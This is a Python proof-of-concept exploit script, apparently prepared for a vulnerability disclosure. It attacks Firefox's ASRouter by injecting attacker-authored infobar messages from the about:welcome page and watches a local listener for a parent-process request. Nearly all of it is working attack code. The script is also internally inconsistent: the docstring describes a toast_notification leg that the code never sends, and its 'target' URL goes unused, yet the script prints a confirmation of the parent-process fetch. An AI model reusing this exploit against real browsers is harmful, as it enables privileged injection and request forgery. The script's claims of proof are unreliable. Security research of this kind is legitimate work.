#!/usr/bin/env python3
"""
ASRouter arbitrary message injection from a privilegedabout page.

Page script in about:welcome calls window.ASRouterMessage({type:"MODIFY_MESSAGE_JSON", ...})
with a message it authored. The parent renders it as browser chrome.

This PoC proves the ROUTE by injecting an `infobar` message and then reading the
chrome DOM to show the attacker-controlled text was rendered. It also points a
`toast_notification` message at a local listener; that leg only fires on
Windows/macOS (see report - Linux throws NS_ERROR_NOT_IMPLEMENTED earlier).

READ-ONLY. Set FF_BIN to a stock Firefox 153.0.1 build.
"""
import http.server, json, os, socket, subprocess, sys, threading, time, shutil, signal

HERE   = os.path.dirname(os.path.abspath(__file__))
SP     = os.path.dirname(HERE)
FF_BIN = os.environ.get("FF_BIN", "/path/to/firefox-153.0.1/firefox")
PORT   = 9433
MPORT  = 2828
PROFILE = "/tmp/asrouterssrf-profile"
HITS = []

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        HITS.append({"path": self.path, "headers": dict(self.headers)})
        print(f"\n  *** PARENT-PROCESS REQUEST RECEIVED ***")
        print(f"  GET {self.path}")
        for k, v in self.headers.items():
            print(f"    {k}: {v}")
        body = b"\x89PNG\r\n\x1a\n"  # not a real image; the request is the proof
        self.send_response(200)
        self.send_header("Content-Type", "image/png")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

class Marionette:
    def __init__(self, host="127.0.0.1", port=MPORT, timeout=120):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout); self.buf=b""; self.msgid=0; self._read()
    def _read(self):
        while b":" not in self.buf:
            c=self.sock.recv(65536)
            if not c: raise IOError("closed")
            self.buf+=c
        ln,_,rest=self.buf.partition(b":"); n=int(ln)
        while len(rest)<n:
            c=self.sock.recv(65536)
            if not c: raise IOError("closed")
            rest+=c
        self.buf=rest[n:]; return json.loads(rest[:n])
    def cmd(self,name,params=None):
        self.msgid+=1
        raw=json.dumps([0,self.msgid,name,params or {}]).encode()
        self.sock.sendall(str(len(raw)).encode()+b":"+raw)
        while True:
            m=self._read()
            if m[0]==1 and m[1]==self.msgid:
                if m[2]: raise RuntimeError(f"{name} -> {m[2]}")
                return m[3]

def main():
    if not os.path.exists(FF_BIN):
        sys.exit(f"set FF_BIN - not found: {FF_BIN}")
    srv=http.server.ThreadingHTTPServer(("127.0.0.1",PORT),H)
    threading.Thread(target=srv.serve_forever,daemon=True).start()
    print(f"listener on 127.0.0.1:{PORT}")

    shutil.rmtree(PROFILE, ignore_errors=True); os.makedirs(PROFILE, exist_ok=True)
    with open(os.path.join(PROFILE,"user.js"),"w") as f:
        f.write('user_pref("marionette.enabled", true);\n'
                'user_pref("remote.active-protocols", 2);\n'
                'user_pref("browser.shell.checkDefaultBrowser", false);\n'
                'user_pref("datareporting.policy.dataSubmissionEnabled", false);\n')
    proc=subprocess.Popen([FF_BIN,"--marionette","--no-remote","-remote-allow-system-access",
                           "--profile",PROFILE,"about:welcome"],
                          stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,preexec_fn=os.setsid)
    try:
        for _ in range(60):
            try: m=Marionette(); break
            except OSError: time.sleep(1)
        else: raise SystemExit("marionette never came up")
        m.cmd("WebDriver:NewSession", {"capabilities": {}})
        time.sleep(4)

        target=f"http://127.0.0.1:{PORT}/ASROUTER-TOAST-PARENT-SSRF"
        print(f"target for the parent to fetch: {target}\n")

        # ---- ROUTE TEST: page-supplied message rendered as browser chrome (observable on Linux) ----
        m.cmd("Marionette:SetContext", {"value": "content"})
        sent = m.cmd("WebDriver:ExecuteScript", {"script": """
          if (typeof window.ASRouterMessage !== "function") { return "NO-ASRouterMessage"; }
          try {
            window.ASRouterMessage({
              type: "MODIFY_MESSAGE_JSON",
              data: { content: {
                id: "SNOX_INFOBAR_PROBE",
                template: "infobar",
                content: {
                  type: "global",
                  text: "SNOX-ASROUTER-ROUTE-PROOF",
                  buttons: [{ label: "ok", action: { type: "CANCEL" } }],
                },
              } },
            });
            return "sent";
          } catch (e) { return "threw: " + String(e); }
        """, "args": [], "sandbox": None})
        print("page sent infobar message:", sent.get("value") if isinstance(sent,dict) else sent)
        time.sleep(4)

        m.cmd("Marionette:SetContext", {"value": "chrome"})
        seen = m.cmd("WebDriver:ExecuteScript", {"script": """
          const win = Services.wm.getMostRecentWindow("navigator:browser");
          const out = [];
          for (const nb of win.document.querySelectorAll("notification-message, notification")) {
            out.push((nb.getAttribute("value") || "") + "|" + (nb.textContent || "").slice(0, 120));
          }
          const boxes = win.gNotificationBox ? win.gNotificationBox.allNotifications.length : -1;
          return JSON.stringify({ nodes: out, boxCount: boxes });
        """, "args": [], "sandbox": None})
        print("chrome notification state:", seen.get("value") if isinstance(seen,dict) else seen)

        for _ in range(20):
            if HITS: break
            time.sleep(0.5)
        time.sleep(2)

        print("\n"+"="*74)
        if HITS:
            print("CONFIRMED - the PARENT process fetched an attacker-chosen URL.")
            print("  route: about:welcome page script -> window.ASRouterMessage(MODIFY_MESSAGE_JSON)")
            print("      -> ASRouterParent (no message-name filter)")
            print("      -> ASRouter.routeCFRMessage(data.content) -> case 'toast_notification'")
            print("      -> ToastNotification.showToastNotification")
            print("      -> Services.io.newChannelFromURI(<attacker URI>, systemPrincipal, TYPE_IMAGE)")
            print(f"  hits: {[h['path'] for h in HITS]}")
        else:
            print("NOT CONFIRMED - no request reached the listener.")
        print("="*74)
    finally:
        try: os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except Exception: pass
        for _ in range(20):
            if proc.poll() is not None: break
            time.sleep(0.5)
        srv.shutdown()

if __name__=="__main__":
    main()
